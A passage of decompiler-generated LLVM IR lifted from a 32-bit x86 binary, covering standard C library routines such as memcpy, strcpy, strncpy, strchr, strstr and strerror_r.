  %v0_804f137 = load i32, i32* %stack_var_-28, align 4
  %v1_804f137 = call i32 @__errno_location(i32 %v0_804f137)
  %v1_804f13c = inttoptr i32 %v1_804f137 to i32*
  store i32 22, i32* %v1_804f13c, align 4
  br label %dec_label_pc_804f142

dec_label_pc_804f142:                             ; preds = %dec_label_pc_804f10a, %dec_label_pc_804f106, %dec_label_pc_804f0f2, %dec_label_pc_804f133
  br label %dec_label_pc_804f144

dec_label_pc_804f144:                             ; preds = %dec_label_pc_804f119, %dec_label_pc_804f142
  %v0_804f147 = phi i32 [ %v11_804f12c, %dec_label_pc_804f119 ], [ 0, %dec_label_pc_804f142 ]
  store i32 %v0_804f0d5, i32* @esi, align 4
  store i32 %v0_804f0d4, i32* @edi, align 4
  ret i32 %v0_804f147

; uselistorder directives
  uselistorder i32 %v0_804f0f2, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f144, { 1, 0 }
  uselistorder label %dec_label_pc_804f142, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f149 = load i32, i32* @esi, align 4
  store i32 %v0_804f149, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f14a = sdiv i32 %sext, 16777216
  store i32 %v4_804f14a, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f154 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f154, i32* %edi.global-to-local, align 4
  %v2_804f158 = udiv i32 %v4_804f14a, 4
  %v3_804f15b = inttoptr i32 %arg2 to i8*
  %v4_804f15b = bitcast i16* %arg1 to i8*
  %v5_804f15b = call i8* @_memcpy(i8* %v4_804f15b, i8* %v3_804f15b, i32 %v2_804f158)
  %v6_804f15b = ptrtoint i8* %v5_804f15b to i32
  store i32 %v6_804f15b, i32* @ecx, align 4
  %v0_804f15d = load i32, i32* %eax.global-to-local, align 4
  %v2_804f15d = and i32 %v0_804f15d, 2
  %v3_804f15d = icmp eq i32 %v2_804f15d, 0
  br i1 %v3_804f15d, label %dec_label_pc_804f163, label %dec_label_pc_804f161

dec_label_pc_804f161:                             ; preds = %entry
  %v0_804f161 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f161 = inttoptr i32 %v0_804f161 to i16*
  %v2_804f161 = load i16, i16* %v1_804f161, align 2
  %v3_804f161 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f161 = inttoptr i32 %v3_804f161 to i16*
  store i16 %v2_804f161, i16* %v4_804f161, align 2
  %v5_804f161 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f161 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f161 = load i1, i1* @df, align 1
  %v8_804f161 = select i1 %v7_804f161, i32 -2, i32 2
  %v9_804f161 = add i32 %v8_804f161, %v5_804f161
  %v10_804f161 = add i32 %v8_804f161, %v6_804f161
  store i32 %v9_804f161, i32* %edi.global-to-local, align 4
  store i32 %v10_804f161, i32* %esi.global-to-local, align 4
  %v0_804f163.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f163

dec_label_pc_804f163:                             ; preds = %entry, %dec_label_pc_804f161
  %v0_804f163 = phi i32 [ %v0_804f15d, %entry ], [ %v0_804f163.pre, %dec_label_pc_804f161 ]
  %v2_804f163 = urem i32 %v0_804f163, 2
  %v3_804f163 = icmp eq i32 %v2_804f163, 0
  br i1 %v3_804f163, label %dec_label_pc_804f168, label %dec_label_pc_804f167

dec_label_pc_804f167:                             ; preds = %dec_label_pc_804f163
  %v0_804f167 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f167 = inttoptr i32 %v0_804f167 to i8*
  %v2_804f167 = load i8, i8* %v1_804f167, align 1
  %v3_804f167 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f167 = inttoptr i32 %v3_804f167 to i8*
  store i8 %v2_804f167, i8* %v4_804f167, align 1
  %v5_804f167 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f167 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f167 = load i1, i1* @df, align 1
  %v8_804f167 = select i1 %v7_804f167, i32 -1, i32 1
  %v9_804f167 = add i32 %v8_804f167, %v5_804f167
  %v10_804f167 = add i32 %v8_804f167, %v6_804f167
  store i32 %v9_804f167, i32* %edi.global-to-local, align 4
  store i32 %v10_804f167, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f168

dec_label_pc_804f168:                             ; preds = %dec_label_pc_804f163, %dec_label_pc_804f167
  store i32 %v4_804f154, i32* %eax.global-to-local, align 4
  %v2_804f16c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f16c, i32* @esi, align 4
  ret i32 %v4_804f154

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f168, { 1, 0 }
  uselistorder label %dec_label_pc_804f163, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804f170 = load i32, i32* @edi, align 4
  %v4_804f179 = ptrtoint i8* %arg1 to i32
  %v5_804f17d = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804f17d = ptrtoint i8* %v5_804f17d to i32
  store i32 %v6_804f17d, i32* @ecx, align 4
  store i32 %v0_804f170, i32* @edi, align 4
  ret i32 %v4_804f179

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f189 = ptrtoint i8* %arg1 to i32
  %v2_804f191 = mul i32 %arg2, 256
  %v3_804f191 = and i32 %v2_804f191, 65280
  %v4_804f191 = and i32 %arg2, -65281
  %v5_804f191 = or i32 %v3_804f191, %v4_804f191
  %v8_804f193.pre = load i1, i1* @df, align 1
  %v9_804f193 = select i1 %v8_804f193.pre, i32 -1, i32 1
  br label %dec_label_pc_804f193

dec_label_pc_804f193:                             ; preds = %dec_label_pc_804f198, %entry
  %v4_804f193 = phi i32 [ %v6_804f193, %dec_label_pc_804f198 ], [ %v5_804f191, %entry ]
  %v7_804f193 = phi i32 [ %v10_804f193, %dec_label_pc_804f198 ], [ %v4_804f189, %entry ]
  %v1_804f193 = inttoptr i32 %v7_804f193 to i8*
  %v2_804f193 = load i8, i8* %v1_804f193, align 1
  %v10_804f193 = add i32 %v7_804f193, %v9_804f193
  %v3_804f194 = udiv i32 %v4_804f193, 256
  %v4_804f194 = trunc i32 %v3_804f194 to i8
  %v16_804f194 = icmp eq i8 %v2_804f193, %v4_804f194
  br i1 %v16_804f194, label %dec_label_pc_804f1a1.loopexit, label %dec_label_pc_804f198

dec_label_pc_804f198:                             ; preds = %dec_label_pc_804f193
  %v3_804f193 = zext i8 %v2_804f193 to i32
  %v5_804f193 = and i32 %v4_804f193, -256
  %v6_804f193 = or i32 %v3_804f193, %v5_804f193
  %v4_804f198 = icmp eq i8 %v2_804f193, 0
  %v1_804f19a = icmp eq i1 %v4_804f198, false
  br i1 %v1_804f19a, label %dec_label_pc_804f193, label %dec_label_pc_804f19c

dec_label_pc_804f19c:                             ; preds = %dec_label_pc_804f198
  br label %dec_label_pc_804f1a1

dec_label_pc_804f1a1.loopexit:                    ; preds = %dec_label_pc_804f193
  %phitmp = add i32 %v10_804f193, -1
  br label %dec_label_pc_804f1a1

dec_label_pc_804f1a1:                             ; preds = %dec_label_pc_804f1a1.loopexit, %dec_label_pc_804f19c
  %v0_804f1a1 = phi i32 [ 0, %dec_label_pc_804f19c ], [ %phitmp, %dec_label_pc_804f1a1.loopexit ]
  ret i32 %v0_804f1a1

; uselistorder directives
  uselistorder i8 %v2_804f193, { 1, 2, 0 }
  uselistorder i32 %v4_804f193, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f1a9 = load i32, i32* @esi, align 4
  store i32 %v0_804f1a9, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f1b1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f1b1, i32* %edi.global-to-local, align 4
  %v4_804f1b5.pre = load i32, i32* @eax, align 4
  %v8_804f1b5.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804f1b5

dec_label_pc_804f1b5:                             ; preds = %dec_label_pc_804f1b5.dec_label_pc_804f1b5_crit_edge, %entry
  %v2_804f1b6 = phi i32 [ %v7_804f1b6, %dec_label_pc_804f1b5.dec_label_pc_804f1b5_crit_edge ], [ %v4_804f1b1, %entry ]
  %v8_804f1b5 = phi i1 [ %v5_804f1b6, %dec_label_pc_804f1b5.dec_label_pc_804f1b5_crit_edge ], [ %v8_804f1b5.pre, %entry ]
  %v4_804f1b5 = phi i32 [ %v0_804f1b7, %dec_label_pc_804f1b5.dec_label_pc_804f1b5_crit_edge ], [ %v4_804f1b5.pre, %entry ]
  %v7_804f1b5 = phi i32 [ %v0_804f1b5.pre, %dec_label_pc_804f1b5.dec_label_pc_804f1b5_crit_edge ], [ %arg2, %entry ]
  %v1_804f1b5 = inttoptr i32 %v7_804f1b5 to i8*
  %v2_804f1b5 = load i8, i8* %v1_804f1b5, align 1
  %v3_804f1b5 = zext i8 %v2_804f1b5 to i32
  %v5_804f1b5 = and i32 %v4_804f1b5, -256
  %v6_804f1b5 = or i32 %v3_804f1b5, %v5_804f1b5
  store i32 %v6_804f1b5, i32* %eax.global-to-local, align 4
  %v9_804f1b5 = select i1 %v8_804f1b5, i32 -1, i32 1
  %v10_804f1b5 = add i32 %v7_804f1b5, %v9_804f1b5
  store i32 %v10_804f1b5, i32* %esi.global-to-local, align 4
  %v3_804f1b6 = inttoptr i32 %v2_804f1b6 to i8*
  store i8 %v2_804f1b5, i8* %v3_804f1b6, align 1
  %v4_804f1b6 = load i32, i32* %edi.global-to-local, align 4
  %v5_804f1b6 = load i1, i1* @df, align 1
  %v6_804f1b6 = select i1 %v5_804f1b6, i32 -1, i32 1
  %v7_804f1b6 = add i32 %v6_804f1b6, %v4_804f1b6
  store i32 %v7_804f1b6, i32* %edi.global-to-local, align 4
  %v0_804f1b7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f1b7 = trunc i32 %v0_804f1b7 to i8
  %v4_804f1b7 = icmp eq i8 %v3_804f1b7, 0
  %v1_804f1b9 = icmp eq i1 %v4_804f1b7, false
  br i1 %v1_804f1b9, label %dec_label_pc_804f1b5.dec_label_pc_804f1b5_crit_edge, label %dec_label_pc_804f1bb

dec_label_pc_804f1b5.dec_label_pc_804f1b5_crit_edge: ; preds = %dec_label_pc_804f1b5
  %v0_804f1b5.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f1b5

dec_label_pc_804f1bb:                             ; preds = %dec_label_pc_804f1b5
  store i32 %v4_804f1b1, i32* %eax.global-to-local, align 4
  %v2_804f1bf = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f1bf, i32* @edx, align 4
  %v2_804f1c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f1c0, i32* @esi, align 4
  ret i32 %v4_804f1b1

; uselistorder directives
  uselistorder i32 %v0_804f1b7, { 1, 0 }
  uselistorder i32 %v7_804f1b6, { 1, 0 }
  uselistorder i1 %v5_804f1b6, { 1, 0 }
  uselistorder i32 %v4_804f1b1, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f1d9 = load i32, i32* @esi, align 4
  store i32 %v0_804f1d9, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f1e5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f1e5, i32* %edi.global-to-local, align 4
  %v1_804f1e9 = add i32 %arg3, 1
  store i32 %v1_804f1e9, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f1ea

dec_label_pc_804f1ea:                             ; preds = %dec_label_pc_804f1ed, %entry
  %v3_804f1ee = phi i32 [ %v4_804f1e5, %entry ], [ %v8_804f1ee, %dec_label_pc_804f1ed ]
  %v0_804f1ea = phi i32 [ %v1_804f1e9, %entry ], [ %v0_804f1ea.pre, %dec_label_pc_804f1ed ]
  %v1_804f1ea = add i32 %v0_804f1ea, -1
  %v8_804f1ea = icmp eq i32 %v1_804f1ea, 0
  store i32 %v1_804f1ea, i32* %ecx.global-to-local, align 4
  br i1 %v8_804f1ea, label %.loopexit, label %dec_label_pc_804f1ed

dec_label_pc_804f1ed:                             ; preds = %dec_label_pc_804f1ea
  %v0_804f1ed = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1ed = inttoptr i32 %v0_804f1ed to i8*
  %v2_804f1ed = load i8, i8* %v1_804f1ed, align 1
  %v10_804f1ed = load i1, i1* @df, align 1
  %v11_804f1ed = select i1 %v10_804f1ed, i32 -1, i32 1
  %v12_804f1ed = add i32 %v11_804f1ed, %v0_804f1ed
  store i32 %v12_804f1ed, i32* %esi.global-to-local, align 4
  %v4_804f1ee = inttoptr i32 %v3_804f1ee to i8*
  store i8 %v2_804f1ed, i8* %v4_804f1ee, align 1
  %v5_804f1ee = load i32, i32* %edi.global-to-local, align 4
  %v6_804f1ee = load i1, i1* @df, align 1
  %v7_804f1ee = select i1 %v6_804f1ee, i32 -1, i32 1
  %v8_804f1ee = add i32 %v7_804f1ee, %v5_804f1ee
  store i32 %v8_804f1ee, i32* %edi.global-to-local, align 4
  %v6_804f1ef = icmp eq i8 %v2_804f1ed, 0
  %v1_804f1f1 = icmp eq i1 %v6_804f1ef, false
  %v0_804f1ea.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f1f1, label %dec_label_pc_804f1ea, label %dec_label_pc_804f1f3

dec_label_pc_804f1f3:                             ; preds = %dec_label_pc_804f1ed
  %v1_804f1f3 = add i32 %v0_804f1ea.pre, -1
  store i32 %v1_804f1f3, i32* %ecx.global-to-local, align 4
  %v2_804f1f4 = sext i8 %v2_804f1ed to i32
  %v4_804f1f4 = inttoptr i32 %v8_804f1ee to i8*
  %v5_804f1f4 = call i8* @_memset(i8* %v4_804f1f4, i32 %v2_804f1f4, i32 %v1_804f1f3)
  %v6_804f1f4 = ptrtoint i8* %v5_804f1f4 to i32
  store i32 %v6_804f1f4, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804f1ea, %dec_label_pc_804f1f3
  %v2_804f1fa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f1fa, i32* @edx, align 4
  %v2_804f1fb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f1fb, i32* @esi, align 4
  ret i32 %v4_804f1e5

; uselistorder directives
  uselistorder i32 %v8_804f1ee, { 0, 2, 1 }
  uselistorder i8 %v2_804f1ed, { 0, 2, 1 }
  uselistorder i32 %v1_804f1ea, { 1, 0 }
  uselistorder i32 %v4_804f1e5, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_804f200 = ptrtoint i8* %tmp4 to i32
  %v8_804f2135 = icmp eq i32 %tmp, 0
  %v1_804f2146 = icmp eq i1 %v8_804f2135, false
  br i1 %v1_804f2146, label %dec_label_pc_804f20d, label %dec_label_pc_804f216

dec_label_pc_804f20d:                             ; preds = %entry, %dec_label_pc_804f212
  %v1_804f2138 = phi i32 [ %v1_804f213, %dec_label_pc_804f212 ], [ %tmp, %entry ]
  %v0_804f2167 = phi i32 [ %v1_804f212, %dec_label_pc_804f212 ], [ %v4_804f200, %entry ]
  %v1_804f20d = inttoptr i32 %v0_804f2167 to i8*
  %v2_804f20d = load i8, i8* %v1_804f20d, align 1
  %v3_804f20d = icmp eq i8 %v2_804f20d, 0
  br i1 %v3_804f20d, label %dec_label_pc_804f216, label %dec_label_pc_804f212

dec_label_pc_804f212:                             ; preds = %dec_label_pc_804f20d
  %v1_804f212 = add i32 %v0_804f2167, 1
  %v1_804f213 = add i32 %v1_804f2138, -1
  %v8_804f213 = icmp eq i32 %v1_804f213, 0
  %v1_804f214 = icmp eq i1 %v8_804f213, false
  br i1 %v1_804f214, label %dec_label_pc_804f20d, label %dec_label_pc_804f216

dec_label_pc_804f216:                             ; preds = %dec_label_pc_804f212, %dec_label_pc_804f20d, %entry
  %v0_804f216.lcssa = phi i32 [ %v4_804f200, %entry ], [ %v0_804f2167, %dec_label_pc_804f20d ], [ %v1_804f212, %dec_label_pc_804f212 ]
  %v2_804f216 = sub i32 %v0_804f216.lcssa, %v4_804f200
  ret i32 %v2_804f216

; uselistorder directives
  uselistorder i32 %v1_804f213, { 1, 0 }
  uselistorder i32 %v0_804f2167, { 0, 2, 1 }
  uselistorder i32 %v4_804f200, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f20d, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_804f21f = load i32, i32* @ebx, align 4
  %v4_804f223 = ptrtoint i8* %arg2 to i32
  %v2_804f22b = load i8, i8* %arg2, align 1
  %v1_804f22e = icmp eq i8 %v2_804f22b, 0
  br i1 %v1_804f22e, label %dec_label_pc_804f2db, label %dec_label_pc_804f236

dec_label_pc_804f236:                             ; preds = %entry
  %v1_804f236 = add i32 %arg1, -1
  br label %dec_label_pc_804f237

dec_label_pc_804f237:                             ; preds = %dec_label_pc_804f243, %dec_label_pc_804f236
  %v0_804f237 = phi i32 [ %v1_804f237, %dec_label_pc_804f243 ], [ %v1_804f236, %dec_label_pc_804f236 ]
  %v1_804f237 = add i32 %v0_804f237, 1
  %v1_804f238 = inttoptr i32 %v1_804f237 to i8*
  %v2_804f238 = load i8, i8* %v1_804f238, align 1
  %v1_804f23b = icmp eq i8 %v2_804f238, 0
  br i1 %v1_804f23b, label %dec_label_pc_804f2d9, label %dec_label_pc_804f243

dec_label_pc_804f243:                             ; preds = %dec_label_pc_804f237
  %v12_804f243 = icmp eq i8 %v2_804f238, %v2_804f22b
  %v1_804f245 = icmp eq i1 %v12_804f243, false
  br i1 %v1_804f245, label %dec_label_pc_804f237, label %dec_label_pc_804f247

dec_label_pc_804f247:                             ; preds = %dec_label_pc_804f243
  %v1_804f247 = add i32 %v4_804f223, 1
  %v2_804f24e = inttoptr i32 %v1_804f247 to i8*
  %v3_804f24e = load i8, i8* %v2_804f24e, align 1
  %v1_804f255 = icmp eq i8 %v3_804f24e, 0
  br i1 %v1_804f255, label %dec_label_pc_804f2db, label %dec_label_pc_804f259

dec_label_pc_804f259:                             ; preds = %dec_label_pc_804f247
  %v1_804f259 = add i32 %v0_804f237, 2
  %v1_804f29a = add i32 %v4_804f223, 2
  %v2_804f29a = inttoptr i32 %v1_804f29a to i8*
  br label %dec_label_pc_804f28c

dec_label_pc_804f264:                             ; preds = %dec_label_pc_804f2d1
  %v2_804f264 = inttoptr i32 %v0_804f29f to i8*
  %v3_804f264 = load i8, i8* %v2_804f264, align 1
  br label %dec_label_pc_804f281.preheader

dec_label_pc_804f281.preheader:                   ; preds = %dec_label_pc_804f264, %dec_label_pc_804f28c
  %v0_804f26d.ph.in = phi i8 [ %v0_804f28127.in, %dec_label_pc_804f28c ], [ %v3_804f264, %dec_label_pc_804f264 ]
  %v12_804f28154 = icmp eq i8 %v0_804f26d.ph.in, %v2_804f22b
  %v1_804f28355 = icmp eq i1 %v12_804f28154, false
  br i1 %v1_804f28355, label %dec_label_pc_804f26d, label %dec_label_pc_804f285

dec_label_pc_804f26d:                             ; preds = %dec_label_pc_804f281.preheader, %dec_label_pc_804f27d
  %v0_804f26d57.in = phi i8 [ %v2_804f27e, %dec_label_pc_804f27d ], [ %v0_804f26d.ph.in, %dec_label_pc_804f281.preheader ]
  %v0_804f27156 = phi i32 [ %v1_804f27d, %dec_label_pc_804f27d ], [ %v0_804f29f, %dec_label_pc_804f281.preheader ]
  %v1_804f26d = icmp eq i8 %v0_804f26d57.in, 0
  br i1 %v1_804f26d, label %dec_label_pc_804f2d9, label %dec_label_pc_804f271

dec_label_pc_804f271:                             ; preds = %dec_label_pc_804f26d
  %v1_804f271 = add i32 %v0_804f27156, 1
  %v1_804f272 = inttoptr i32 %v1_804f271 to i8*
  %v2_804f272 = load i8, i8* %v1_804f272, align 1
  %v12_804f275 = icmp eq i8 %v2_804f272, %v2_804f22b
  br i1 %v12_804f275, label %dec_label_pc_804f285, label %dec_label_pc_804f279

dec_label_pc_804f279:                             ; preds = %dec_label_pc_804f271
  %v1_804f279 = icmp eq i8 %v2_804f272, 0
  br i1 %v1_804f279, label %dec_label_pc_804f2d9, label %dec_label_pc_804f27d

dec_label_pc_804f27d:                             ; preds = %dec_label_pc_804f279
  %v1_804f27d = add i32 %v0_804f27156, 2
  %v1_804f27e = inttoptr i32 %v1_804f27d to i8*
  %v2_804f27e = load i8, i8* %v1_804f27e, align 1
  %v12_804f281 = icmp eq i8 %v2_804f27e, %v2_804f22b
  %v1_804f283 = icmp eq i1 %v12_804f281, false
  br i1 %v1_804f283, label %dec_label_pc_804f26d, label %dec_label_pc_804f285

dec_label_pc_804f285:                             ; preds = %dec_label_pc_804f27d, %dec_label_pc_804f271, %dec_label_pc_804f281.preheader
  %v0_804f285 = phi i32 [ %v0_804f29f, %dec_label_pc_804f281.preheader ], [ %v1_804f271, %dec_label_pc_804f271 ], [ %v1_804f27d, %dec_label_pc_804f27d ]
  %v1_804f285 = add i32 %v0_804f285, 1
  br label %dec_label_pc_804f28c

dec_label_pc_804f28c:                             ; preds = %dec_label_pc_804f259, %dec_label_pc_804f285
  %v0_804f28127.in.in.in = phi i32 [ %v1_804f285, %dec_label_pc_804f285 ], [ %v1_804f259, %dec_label_pc_804f259 ]
  %v0_804f29f = phi i32 [ %v1_804f285, %dec_label_pc_804f285 ], [ %v1_804f259, %dec_label_pc_804f259 ]
  %v0_804f28127.in.in = inttoptr i32 %v0_804f28127.in.in.in to i8*
  %v0_804f28127.in = load i8, i8* %v0_804f28127.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_804f28127.in, %v3_804f24e
  %v1_804f28c = icmp eq i1 %storemerge4, false
  br i1 %v1_804f28c, label %dec_label_pc_804f281.preheader, label %dec_label_pc_804f28e

dec_label_pc_804f28e:                             ; preds = %dec_label_pc_804f28c
  %v1_804f296 = add i32 %v0_804f29f, 1
  %v2_804f296 = inttoptr i32 %v1_804f296 to i8*
  %v3_804f296 = load i8, i8* %v2_804f296, align 1
  %v3_804f29a = load i8, i8* %v2_804f29a, align 1
  %v1_804f2a2 = add i32 %v0_804f29f, -1
  %v12_804f2a5 = icmp eq i8 %v3_804f296, %v3_804f29a
  %v1_804f2a7 = icmp eq i1 %v12_804f2a5, false
  br i1 %v1_804f2a7, label %dec_label_pc_804f2d1, label %dec_label_pc_804f2a9.preheader

dec_label_pc_804f2a9.preheader:                   ; preds = %dec_label_pc_804f28e
  %v1_804f2a910 = icmp eq i8 %v3_804f296, 0
  br i1 %v1_804f2a910, label %dec_label_pc_804f2db, label %dec_label_pc_804f2ad

dec_label_pc_804f2ad:                             ; preds = %dec_label_pc_804f2a9.preheader, %dec_label_pc_804f2cd
  %v0_804f2c0 = phi i32 [ %v1_804f2c0, %dec_label_pc_804f2cd ], [ %v1_804f29a, %dec_label_pc_804f2a9.preheader ]
  %v0_804f2bd = phi i32 [ %v1_804f2bd, %dec_label_pc_804f2cd ], [ %v1_804f296, %dec_label_pc_804f2a9.preheader ]
  %v1_804f2ad = add i32 %v0_804f2bd, 1
  %v2_804f2ad = inttoptr i32 %v1_804f2ad to i8*
  %v3_804f2ad = load i8, i8* %v2_804f2ad, align 1
  %v1_804f2b1 = add i32 %v0_804f2c0, 1
  %v2_804f2b1 = inttoptr i32 %v1_804f2b1 to i8*
  %v3_804f2b1 = load i8, i8* %v2_804f2b1, align 1
  %v12_804f2b5 = icmp eq i8 %v3_804f2ad, %v3_804f2b1
  %v1_804f2b7 = icmp eq i1 %v12_804f2b5, false
  br i1 %v1_804f2b7, label %dec_label_pc_804f2d1, label %dec_label_pc_804f2b9

dec_label_pc_804f2b9:                             ; preds = %dec_label_pc_804f2ad
  %v1_804f2b9 = icmp eq i8 %v3_804f2b1, 0
  br i1 %v1_804f2b9, label %dec_label_pc_804f2db, label %dec_label_pc_804f2bd

dec_label_pc_804f2bd:                             ; preds = %dec_label_pc_804f2b9
  %v1_804f2bd = add i32 %v0_804f2bd, 2
  %v1_804f2c0 = add i32 %v0_804f2c0, 2
  %v1_804f2c3 = inttoptr i32 %v1_804f2bd to i8*
  %v2_804f2c3 = load i8, i8* %v1_804f2c3, align 1
  %v1_804f2c6 = inttoptr i32 %v1_804f2c0 to i8*
  %v2_804f2c6 = load i8, i8* %v1_804f2c6, align 1
  %v12_804f2c9 = icmp eq i8 %v2_804f2c3, %v2_804f2c6
  %v1_804f2cb = icmp eq i1 %v12_804f2c9, false
  br i1 %v1_804f2cb, label %dec_label_pc_804f2d1, label %dec_label_pc_804f2cd

dec_label_pc_804f2cd:                             ; preds = %dec_label_pc_804f2bd
  %v1_804f2a9 = icmp eq i8 %v2_804f2c6, 0
  br i1 %v1_804f2a9, label %dec_label_pc_804f2db, label %dec_label_pc_804f2ad

dec_label_pc_804f2d1:                             ; preds = %dec_label_pc_804f2bd, %dec_label_pc_804f2ad, %dec_label_pc_804f28e
  %v0_804f2d1.in = phi i8 [ %v3_804f29a, %dec_label_pc_804f28e ], [ %v2_804f2c6, %dec_label_pc_804f2bd ], [ %v3_804f2b1, %dec_label_pc_804f2ad ]
  %v1_804f2d1 = icmp eq i8 %v0_804f2d1.in, 0
  %v1_804f2d3 = icmp eq i1 %v1_804f2d1, false
  br i1 %v1_804f2d3, label %dec_label_pc_804f264, label %dec_label_pc_804f2db

dec_label_pc_804f2d9:                             ; preds = %dec_label_pc_804f237, %dec_label_pc_804f279, %dec_label_pc_804f26d
  br label %dec_label_pc_804f2db

dec_label_pc_804f2db:                             ; preds = %dec_label_pc_804f2a9.preheader, %dec_label_pc_804f2d1, %dec_label_pc_804f2b9, %dec_label_pc_804f2cd, %entry, %dec_label_pc_804f247, %dec_label_pc_804f2d9
  %storemerge2 = phi i32 [ 0, %dec_label_pc_804f2d9 ], [ %v1_804f237, %dec_label_pc_804f247 ], [ %arg1, %entry ], [ %v1_804f2a2, %dec_label_pc_804f2cd ], [ %v1_804f2a2, %dec_label_pc_804f2b9 ], [ %v1_804f2a2, %dec_label_pc_804f2d1 ], [ %v1_804f2a2, %dec_label_pc_804f2a9.preheader ]
  store i32 %v0_804f21f, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_804f2c6, { 0, 2, 1 }
  uselistorder i32 %v1_804f2c0, { 1, 0 }
  uselistorder i32 %v1_804f2bd, { 1, 0 }
  uselistorder i8 %v3_804f2b1, { 0, 2, 1 }
  uselistorder i8 %v3_804f296, { 1, 0 }
  uselistorder i32 %v0_804f29f, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_804f285, { 1, 0 }
  uselistorder i8 %v2_804f27e, { 1, 0 }
  uselistorder i32 %v1_804f27d, { 0, 2, 1 }
  uselistorder i8 %v2_804f272, { 1, 0 }
  uselistorder i32 %v0_804f27156, { 1, 0 }
  uselistorder i32 %v1_804f259, { 1, 0 }
  uselistorder i32 %v1_804f237, { 0, 2, 1 }
  uselistorder i8 %v2_804f22b, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f2db, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_804f2d9, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f2ad, { 1, 0 }
  uselistorder label %dec_label_pc_804f28c, { 1, 0 }
  uselistorder label %dec_label_pc_804f26d, { 1, 0 }
  uselistorder label %dec_label_pc_804f281.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804f2f5 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804f2fa = load i32, i32* @ebx, align 4
  ret i32 %v0_804f2fa
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
